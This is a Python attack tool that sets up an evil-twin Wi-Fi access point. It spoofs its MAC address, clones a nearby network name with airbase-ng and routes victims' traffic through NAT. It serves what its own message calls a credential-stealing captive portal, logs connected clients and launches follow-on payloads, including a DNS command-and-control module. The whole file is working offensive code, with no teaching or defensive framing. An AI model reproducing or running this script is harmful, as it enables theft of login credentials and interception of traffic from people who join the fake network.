#!/usr/bin/env python3
import os
import sys
import time
import signal
import random
import subprocess
from rich.console import Console
from rich.table import Table

console = Console()
clients = set()
AP_IFACE = "wlan0mon"
FAKE_SSID = ""
CAPTIVE_PORTAL_DIR = "/opt/redot/portal"
IP_LOG_FILE = "logs/wifi_clients.txt"

# --- Utility Functions ---

def detect_interface():
    result = subprocess.getoutput("iw dev | grep Interface | awk '{print $2}'")
    interfaces = result.splitlines()
    for iface in interfaces:
        if "mon" in iface:
            return iface
    console.print("[!] No monitor mode interface found.", style="bold red")
    sys.exit(1)

def mac_spoof(interface):
    console.print(f"[*] Spoofing MAC on {interface}...", style="bold yellow")
    os.system(f"ifconfig {interface} down")
    os.system(f"macchanger -r {interface}")
    os.system(f"ifconfig {interface} up")

def list_real_ssids():
    console.print("[*] Scanning for nearby SSIDs...", style="bold cyan")
    os.system(f"airodump-ng {AP_IFACE} -w /tmp/scan --output-format csv &")
    time.sleep(8)
    os.system("pkill airodump-ng")
    ssids = []
    with open("/tmp/scan-01.csv", "r") as f:
        for line in f:
            if "WPA" in line or "WEP" in line:
                parts = line.split(',')
                ssid = parts[13].strip()
                if ssid and ssid not in ssids:
                    ssids.append(ssid)
    return ssids[:5]

def launch_fake_ap(ssid):
    global clients
    console.print(f"[+] Launching fake AP: {ssid}", style="bold green")
    os.system(f"airbase-ng -e \"{ssid}\" -c 6 {AP_IFACE} &")
    time.sleep(4)
    os.system("ifconfig at0 up 10.0.0.1 netmask 255.255.255.0")
    os.system("iptables --flush")
    os.system("iptables -t nat --flush")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    os.system("iptables -A FORWARD -i at0 -j ACCEPT")
    os.system("service dnsmasq restart")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def deploy_captive_portal():
    console.print("[*] Deploying credential-stealing captive portal...", style="bold yellow")
    os.system(f"cp -r {CAPTIVE_PORTAL_DIR}/* /var/www/html/")
    os.system("service apache2 start")

def monitor_clients():
    console.print("[*] Monitoring IP connections to fake AP...", style="bold cyan")
    seen = set()
    while True:
        output = subprocess.getoutput("arp -n")
        for line in output.splitlines():
            if "at0" in line or "10.0.0." in line:
                parts = line.split()
                if len(parts) > 0:
                    ip = parts[0]
                    if ip not in seen:
                        seen.add(ip)
                        with open(IP_LOG_FILE, "a") as log:
                            log.write(f"{ip}\n")
                        console.print(f"[+] New client connected: {ip}", style="bold green")
        time.sleep(10)

def kill_switch():
    console.print("[!] Triggering kill switch...", style="bold red")
    os.system("pkill airbase-ng")
    os.system("service apache2 stop")
    os.system("iptables --flush")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("ifconfig at0 down")
    sys.exit(0)

def screenshot_login_page():
    os.system("wkhtmltoimage http://10.0.0.1 index_screenshot.png")
    console.print("[+] Screenshot of login page saved as index_screenshot.png", style="bold green")

def post_exploitation_chain():
    console.print("[*] Triggering post-exploitation payloads...", style="bold yellow")
    os.system("python3 modules/payloads/dns_c2.py")
    os.system("bash modules/payloads/watering_loop.sh")

# --- Signal Handling ---

def signal_handler(sig, frame):
    kill_switch()

signal.signal(signal.SIGINT, signal_handler)

# --- Main Logic ---

def main():
    global FAKE_SSID
    global AP_IFACE
    AP_IFACE = detect_interface()
    mac_spoof(AP_IFACE)

    ssids = list_real_ssids()
    console.print("\nAvailable SSIDs:", style="bold blue")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Index")
    table.add_column("SSID")
    for i, s in enumerate(ssids):
        table.add_row(str(i + 1), s)
    console.print(table)

    console.print("\n[?] Choose SSID to clone or enter custom name:", style="bold cyan")
    choice = input(f"Enter 1-{len(ssids)} or custom SSID: ").strip()
    if choice.isdigit() and 1 <= int(choice) <= len(ssids):
        FAKE_SSID = ssids[int(choice) - 1]
    else:
        FAKE_SSID = choice

    launch_fake_ap(FAKE_SSID)
    deploy_captive_portal()
    screenshot_login_page()
    post_exploitation_chain()
    monitor_clients()

if __name__ == "__main__":
    main()
